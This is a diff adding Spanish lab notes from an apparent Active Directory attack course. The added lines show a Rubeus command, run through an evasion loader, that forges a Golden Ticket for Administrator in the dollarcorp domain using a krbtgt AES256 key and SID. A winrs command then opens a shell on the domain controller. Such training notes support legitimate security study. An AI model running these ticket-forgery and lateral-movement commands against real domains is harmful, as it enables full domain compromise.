@@ -820,3 +820,13 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256
 ```
 
 Ahora nos genera un comando el cual nos ayuda a falsificar un *Golden Ticket* Recuerda añadir *-path C:\AD\Tools\Rubeus.exe -args* Después de *Loader.exe* y */ptt* al final del comando generado para inyectarlo en el proceso actual
+```shell
+[studne97]
+ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:3249 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
+```
+
+Pudiendonos ahora conectar a *dcorp-dc* a traves de *winrs*
+```shell
+[student97]
+winrs -r:dcorp-dc cmd
+```
